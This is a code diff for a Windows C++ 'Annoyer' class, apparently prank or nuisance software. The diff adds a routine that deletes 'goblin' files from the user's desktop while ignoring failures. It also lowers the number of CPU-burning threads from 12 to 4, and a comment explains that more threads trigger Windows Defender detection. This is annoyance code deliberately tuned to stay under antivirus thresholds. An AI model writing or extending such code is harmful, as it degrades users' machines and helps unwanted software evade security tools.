@@ -5,6 +5,7 @@
 #include <thread>
 #include <mutex>
 #include <atomic>
+#include <windows.h>
 
 Annoyer::Annoyer()
 {
@@ -90,26 +91,33 @@ int Annoyer::j_files_creation(int max_files, Filename_fmt fn_fmt) {
 }
 
 int Annoyer::j_files_removal() {
-	return -1;
+	PWSTR desk_path = get_desktop_path();
+	std::vector<std::wstring> files;
+	std::vector<std::wstring>::iterator  it;
+
+	if (!desk_path) {
+		return -1;
+	}
+
+	files = get_goblin_files_from_path(desk_path);
+	
+	for (it = files.begin(); it != files.end(); it++) {
+		DeleteFileW((*it).c_str()); // Don't care if the delete fails
+	}
+
+	CoTaskMemFree(desk_path);
+	return 0;
 }
 
 int Annoyer::j_cpu_burn(int seconds) {
 	std::atomic_bool stop_flag;
 	stop_flag.store(false);
 
-	// 12 threads to warm that CPU
+	// 4 threads to warm that CPU. More power triggers Windows Defender detection
 	std::thread heater_thread_1(heat_cpu, std::ref(stop_flag));
 	std::thread heater_thread_2(heat_cpu, std::ref(stop_flag));
 	std::thread heater_thread_3(heat_cpu, std::ref(stop_flag));
 	std::thread heater_thread_4(heat_cpu, std::ref(stop_flag));
-	std::thread heater_thread_5(heat_cpu, std::ref(stop_flag));
-	std::thread heater_thread_6(heat_cpu, std::ref(stop_flag));
-	std::thread heater_thread_7(heat_cpu, std::ref(stop_flag));
-	std::thread heater_thread_8(heat_cpu, std::ref(stop_flag));
-	std::thread heater_thread_9(heat_cpu, std::ref(stop_flag));
-	std::thread heater_thread_a(heat_cpu, std::ref(stop_flag));
-	std::thread heater_thread_b(heat_cpu, std::ref(stop_flag));
-	std::thread heater_thread_c(heat_cpu, std::ref(stop_flag));
 
 	// Wait the designated time
 	std::this_thread::sleep_for(std::chrono::seconds(seconds));
@@ -121,14 +129,6 @@ int Annoyer::j_cpu_burn(int seconds) {
 	heater_thread_2.join();
 	heater_thread_3.join();
 	heater_thread_4.join();
-	heater_thread_5.join();
-	heater_thread_6.join();
-	heater_thread_7.join();
-	heater_thread_8.join();
-	heater_thread_9.join();
-	heater_thread_a.join();
-	heater_thread_b.join();
-	heater_thread_c.join();
 
 	return 0;
 }
